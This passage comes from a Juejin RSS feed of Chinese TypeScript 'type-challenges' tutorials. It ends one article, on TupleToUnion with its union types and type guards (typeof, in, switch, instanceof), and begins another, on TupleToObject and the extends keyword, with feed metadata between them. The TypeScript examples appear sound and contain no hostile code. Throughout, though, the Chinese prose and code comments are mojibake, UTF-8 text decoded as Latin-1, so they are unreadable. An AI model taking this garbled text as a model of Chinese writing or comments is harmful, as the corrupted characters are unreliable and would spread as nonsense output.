<h5 data-id="heading-10">3. æå– Promise çš„æ³›å‹å‚æ•°ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå– Promise çš„æ³›å‹ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetPromiseValue</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer <span class="hljs-title class_">Value</span>&gt; ? <span class="hljs-title class_">Value</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseString</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// PromiseString ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseUser</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> }&gt;&gt;; <span class="hljs-comment">// PromiseUser ç±»å‹ä¸º { id: number }</span>
</code></pre>
<h5 data-id="heading-11">4. æå–å‡½æ•°çš„å‚æ•°ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–å‡½æ•°å‚æ•°ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Params</span>) =&gt; <span class="hljs-built_in">any</span> ? <span class="hljs-title class_">Params</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> fn = (<span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {};
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FnParams</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// FnParams ç±»å‹ä¸º [string, number]</span>

<span class="hljs-comment">// è¿›ä¸€æ­¥ï¼šæå–ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FirstParam</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;[<span class="hljs-number">0</span>]; <span class="hljs-comment">// FirstParam ç±»å‹ä¸º string</span>
</code></pre>
<h4 data-id="heading-12"><code>|</code></h4>
<p><code>|</code> è¿ç®—ç¬¦ç”¨äºè¡¨ç¤ºè”åˆç±»å‹ï¼Œå³ä¸€ä¸ªå€¼å¯ä»¥æ˜¯å¤šä¸ªç±»å‹ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚</p>
<ol>
<li>å˜é‡çš„è”åˆç±»å‹æ³¨è§£</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å˜é‡ a å¯ä»¥æ˜¯å­—ç¬¦ä¸² OR æ•°å­—</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// åˆæ³•èµ‹å€¼ï¼ˆç¬¦åˆä»»æ„ä¸€ç§ç±»å‹ï¼‰</span>
a = <span class="hljs-string">"TS"</span>;
a = <span class="hljs-number">123</span>;

<span class="hljs-comment">// éæ³•èµ‹å€¼ï¼ˆä¸å±äºè”åˆç±»å‹ä¸­çš„ä»»ä½•ä¸€ç§ï¼‰ï¼ŒTS ç›´æ¥æŠ¥é”™</span>
a = <span class="hljs-literal">true</span>; <span class="hljs-comment">// âŒ ç±»å‹ 'boolean' ä¸èƒ½èµ‹å€¼ç»™ç±»å‹ 'string | number'</span>
</code></pre>
<ol start="2">
<li>å‡½æ•°å‚æ•°çš„è”åˆç±»å‹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å‡½æ•°æ¥æ”¶ string æˆ– number ç±»å‹çš„å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val);
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_">printValue</span>(<span class="hljs-number">666</span>);

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ŒTS æŠ¥é”™</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// âŒ</span>
</code></pre>
<ol start="3">
<li>æ•°ç»„çš„è”åˆç±»å‹ï¼ˆæ³¨æ„ä¸¤ç§å†™æ³•çš„åŒºåˆ«ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å†™æ³•1ï¼š(A | B)[] â€”â€” æ•°ç»„çš„ã€Œæ¯ä¸ªå…ƒç´ ã€å¯ä»¥æ˜¯ A æˆ– Bï¼ˆæ··åˆæ•°ç»„ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr1</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">"4"</span>]; <span class="hljs-comment">// åˆæ³•</span>

<span class="hljs-comment">// å†™æ³•2ï¼šA[] | B[] â€”â€” ã€Œæ•´ä¸ªæ•°ç»„ã€è¦ä¹ˆå…¨æ˜¯ A ç±»å‹ï¼Œè¦ä¹ˆå…¨æ˜¯ B ç±»å‹ï¼ˆçº¯æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr2</span>: <span class="hljs-built_in">string</span>[] | <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// åˆæ³•ï¼ˆå…¨æ•°å­—ï¼‰</span>
arr2 = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>]; <span class="hljs-comment">// åˆæ³•ï¼ˆå…¨å­—ç¬¦ä¸²ï¼‰</span>
arr2 = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>]; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ··åˆç±»å‹ä¸ç¬¦åˆè¦æ±‚</span>
</code></pre>
<p>å½“ä½¿ç”¨è”åˆç±»å‹çš„æ—¶å€™ï¼Œè®¿é—®æŸä¸€ä¸ªå­ç±»å‹çš„ä¸“å±å±æ€§ / æ–¹æ³•æ—¶ï¼Œéœ€è¦è¿›è¡Œç±»å‹å®ˆå«ï¼Œå¯ç”¨çš„æ–¹æ³•æœ‰ <code>typeof</code> ã€<code>in</code> ã€<code>switch</code> ã€<code>instanceof</code> ã€‚</p>
<ol>
<li><code>typeof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getLength</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-comment">// ç±»å‹çª„åŒ–ï¼šåˆ¤æ–­ val æ˜¯ string ç±»å‹</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">"string"</span>) {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š val æ˜¯ stringï¼Œå¯å®‰å…¨ä½¿ç”¨ length</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-property">length</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š val æ˜¯ numberï¼Œæ‰§è¡Œæ•°å­—ç›¸å…³é€»è¾‘</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>().<span class="hljs-property">length</span>;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"TS"</span>)); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-number">1234</span>)); <span class="hljs-comment">// 4</span>
</code></pre>
<ol start="2">
<li><code>in</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">printUserInfo</span>(<span class="hljs-params">user: { name: <span class="hljs-built_in">string</span> } | { age: <span class="hljs-built_in">number</span> }</span>) {
  <span class="hljs-comment">// ç±»å‹çª„åŒ–ï¼šåˆ¤æ–­ user æ˜¯å¦æœ‰ name å±æ€§ï¼ˆå³æ˜¯å¦æ˜¯ { name: string } ç±»å‹ï¼‰</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> user) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${user.name}</span>`</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š user æ˜¯ { age: number } ç±»å‹</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Age: <span class="hljs-subst">${user.age}</span>`</span>);
  }
}
</code></pre>
<ol start="3">
<li><code>switch</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"user"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"admin"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">permission</span>: <span class="hljs-built_in">string</span>[];
}
<span class="hljs-comment">// è”åˆç±»å‹ï¼šå¯ä»¥æ˜¯ User æˆ– Admin</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = <span class="hljs-title class_">User</span> | <span class="hljs-title class_">Admin</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printPerson</span>(<span class="hljs-params">p: Person</span>) {
  <span class="hljs-keyword">switch</span> (p.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"user"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">age</span>); <span class="hljs-comment">// ç¡®å®šæ˜¯ User</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"admin"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">permission</span>); <span class="hljs-comment">// ç¡®å®šæ˜¯ Admin</span>
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<ol start="4">
<li><code>instanceof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ä¸¤ä¸ªç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ±ªæ±ª"</span>); }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
  <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å–µå–µ"</span>); }
}

<span class="hljs-comment">// è”åˆç±»å‹ï¼šDog æˆ– Cat å®ä¾‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Animal</span> = <span class="hljs-title class_">Dog</span> | <span class="hljs-title class_">Cat</span>;

<span class="hljs-comment">// instanceof ç±»å‹å®ˆå«ï¼ˆé’ˆå¯¹ç±»å®ä¾‹ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">animalCall</span>(<span class="hljs-params">animal: Animal</span>) {
  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
    animal.<span class="hljs-title function_">bark</span>();
  } <span class="hljs-keyword">else</span> {
    animal.<span class="hljs-title function_">meow</span>();
  }
}

<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()); <span class="hljs-comment">// æ±ªæ±ª</span>
<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>()); <span class="hljs-comment">// å–µå–µ</span>
</code></pre>
<h3 data-id="heading-13">æµ‹è¯•ç”¨ä¾‹</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ æµ‹è¯•ç”¨ä¾‹ _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>, <span class="hljs-string">'456'</span>, <span class="hljs-literal">true</span>]&gt;, <span class="hljs-number">123</span> | <span class="hljs-string">'456'</span> | <span class="hljs-literal">true</span>&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>]&gt;, <span class="hljs-number">123</span>&gt;&gt;,
]

</code></pre>
<h3 data-id="heading-14">ç›¸å…³é“¾æ¥</h3>
<blockquote>
<p>åˆ†äº«ä½ çš„è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/answer/zâ€¦</a>
æŸ¥çœ‹è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fsolutions" target="_blank" title="https://tsch.js.org/10/solutions" ref="nofollow noopener noreferrer">tsch.js.org/10/solutionâ€¦</a>
æ›´å¤šé¢˜ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å…¬ä¼—å·ï¼Œæ¬¢è¿å…³æ³¨ã€‚å…³æ³¨åæœ‰æ–°çš„åŠŸèƒ½ç‚¹ä¼šåŠæ—¶æ”¶åˆ°æ¨é€ã€‚</p>
<blockquote>
<p>å®æˆ˜ä¸ºç‹ï¼ä¸“æ³¨äºæ±‡æ€»å„ç§åŠŸèƒ½ç‚¹ï¼Œè‡´åŠ›äºæ‰“é€ ä¸€ç³»åˆ—èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå®ç°å„ç§åŠŸèƒ½çš„æƒ³æ³•æ€è·¯çš„ä¼˜è´¨æ–‡ç« ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390836&amp;x-signature=Ml919VoDzxim80t0Nxp2fWwDcdA%3D" alt="å‰ç«¯åŠŸèƒ½ç‚¹" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡]]></title>    <link>https://juejin.cn/post/7600955777316274214</link>    <guid>https://juejin.cn/post/7600955777316274214</guid>    <pubDate>2026-01-30T15:20:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316274214" data-draft-id="7600953879501275187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:20:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:20:03.000Z" title="Fri Jan 30 2026 15:20:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡</h2>
<p>by sinoon (@sinoon) #ç®€å• #object-keys</p>
<h3 data-id="heading-1">é¢˜ç›®</h3>
<p>å°†ä¸€ä¸ªå…ƒç»„ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡ç±»å‹ï¼Œè¿™ä¸ªå¯¹è±¡ç±»å‹çš„é”®/å€¼å’Œå…ƒç»„ä¸­çš„å…ƒç´ å¯¹åº”ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> result = <span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt; <span class="hljs-comment">// expected { 'tesla': 'tesla', 'model 3': 'model 3', 'model X': 'model X', 'model Y': 'model Y'}</span>
</code></pre>
<blockquote>
<p>åœ¨ Github ä¸ŠæŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">ä»£ç </h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ ä½ çš„ä»£ç  _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToObject</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-title class_">PropertyKey</span>[]&gt; = {
  [P <span class="hljs-keyword">in</span> T[<span class="hljs-built_in">number</span>]]: P
}

</code></pre>
<p>å…³é”®è§£é‡Šï¼š</p>
<ul>
<li><code>type PropertyKey = string | number | symbol</code>ã€‚</li>
<li><code>T extends readonly PropertyKey[]</code> ç”¨äºé™åˆ¶ <code>T</code> å¿…é¡»æ˜¯ä¸€ä¸ªåªè¯»çš„å±æ€§é”®å…ƒç»„ã€‚</li>
<li><code>[P in T[number]]</code> ç”¨äºéå†å…ƒç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†å…¶ä½œä¸ºå¯¹è±¡çš„é”®ã€‚</li>
<li><code>P</code> æ˜¯å…ƒç»„ä¸­çš„å…ƒç´ ç±»å‹ï¼Œé€šè¿‡ <code>T[number]</code> æ¥è·å–ã€‚</li>
</ul>
<h3 data-id="heading-3">ç›¸å…³çŸ¥è¯†ç‚¹</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>ä½¿ç”¨ç»´åº¦</th><th>æ ¸å¿ƒä½œç”¨</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>ç±»å‹ç»´åº¦</td><td>åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­ï¼ˆç±»å‹ç¼–ç¨‹æ ¸å¿ƒï¼‰</td><td>é™å®šæ³›å‹èŒƒå›´ã€åˆ¤æ–­ç±»å‹æ˜¯å¦å…¼å®¹ã€æå–ç±»å‹ç‰‡æ®µ</td></tr><tr><td>è¯­æ³•ç»´åº¦</td><td>åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</td><td>æ¥å£ç»§æ‰¿ã€ç±»ç»§æ‰¿</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­</h5>
<ol>
<li>æ³›å‹çº¦æŸï¼šé™å®šæ³›å‹çš„å–å€¼èŒƒå›´</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// çº¦æŸ T å¿…é¡»æ˜¯ã€Œæ‹¥æœ‰ length å±æ€§ã€çš„ç±»å‹ï¼ˆæ¯”å¦‚ string/æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨ï¼ˆç¬¦åˆçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// âœ… string æœ‰ lengthï¼Œè¿”å› 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ lengthï¼Œè¿”å› 3</span>

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ˆè¶…å‡ºçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šnumber æ²¡æœ‰ length å±æ€§</span>
</code></pre>
<ol start="2">
